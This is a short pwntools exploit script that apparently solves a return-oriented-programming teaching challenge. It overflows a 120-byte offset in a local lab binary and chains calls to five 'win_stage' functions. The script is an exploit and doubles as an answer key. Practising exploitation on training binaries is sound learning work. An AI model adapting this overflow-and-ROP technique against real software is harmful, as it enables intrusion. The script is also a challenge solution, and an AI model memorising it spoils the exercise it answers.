from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level3_teaching1'
p = process('./babyrop_level3_teaching1')
e = ELF('babyrop_level3_teaching1')
p.clean()
r = ROP(context.binary)
for n in range(1, 6):
    r.call(e.sym['win_stage_'+str(n)], [n])
# send the ROP chain
p.sendline(fit({120:r.chain()}))
p.interactive()